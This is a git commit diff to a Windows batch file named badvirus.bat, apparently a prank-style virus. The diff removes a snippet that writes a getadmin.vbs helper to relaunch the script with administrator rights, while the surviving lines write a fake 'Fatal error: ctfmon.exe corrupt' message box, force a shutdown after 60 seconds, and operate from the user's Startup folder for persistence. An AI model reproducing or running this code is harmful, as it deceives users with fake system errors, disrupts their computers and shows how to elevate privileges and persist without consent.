8c4a11c9d89104badfcb2c01cf4b77d095ebdf14
Suprateek Dhar <118747426+sdcardbro123@users.noreply.github.com>
2024-03-02 15:18:16 +0530

    Update badvirus.bat
    admin off

--- badvirus.bat
+++ badvirus.bat
@@ -81,14 +81,6 @@ cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
 
 
-
-
-
-set "params=%*"
-cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/k cd ""%~sdp0"" && ""%~s0"" %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )
-
-@echo off
-
 echo x=msgbox("Fatal error: ctfmon.exe corrupt" ,48, "Windows is Shutting down due to a fatal error") >> msgbox.vbs
 shutdown -s -t 60
 :a
